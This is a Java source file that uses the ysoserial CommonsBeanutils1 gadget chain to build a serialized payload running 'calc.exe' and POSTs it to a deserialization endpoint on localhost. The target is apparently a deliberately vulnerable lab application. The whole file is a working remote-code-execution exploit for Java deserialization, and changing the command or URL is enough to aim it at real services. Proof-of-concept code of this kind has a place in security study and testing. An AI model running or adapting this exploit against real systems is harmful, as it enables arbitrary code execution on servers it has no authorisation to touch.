import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import ysoserial.payloads.*;
 
public class SerialHTTP {
	private static final ObjectInputStream ObjectInputStream = null;

	public static void main (String[] args) throws Exception {

		// Get object to be serialized
       Object a = new CommonsBeanutils1().getObject("calc.exe");
        
        // serialize object - write to byte array
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
	 	ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(a);
		//System.out.println("Byte Array:" );
		byte[] bytes = baos.toByteArray();
	    for(int i=0; i< bytes.length ; i++) {
	    	//System.out.print(bytes[i] +" ");
	    }
	
	    try{    
	    	
	    	//Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("localhost", 8080));
	    	
	    	URL url = new URL("http://localhost:8080/DeserializeMavenSpring/Deserial");
	    	HttpURLConnection con=(HttpURLConnection)url.openConnection();  
	    	con.setRequestMethod("POST");
	    	con.setRequestProperty("Content-Type", "application/x-java-serialized-object");
	        con.setRequestProperty("Connection", "close");
	  
	    	// For POST only - START
	    	con.setDoOutput(true);
	    	OutputStream os = con.getOutputStream();
	    	os.write(bytes);
	    	os.flush();
	    	os.close();
	    	// For POST only - END

			int responseCode = con.getResponseCode();
			System.out.println("Response Code: " + responseCode);
		
			con.disconnect();  
			
	    }catch(Exception e){
	    	System.out.println(e);
			
	    	}    
		}
	    
	    
	    
	    
	    
	    
	    
		

	
}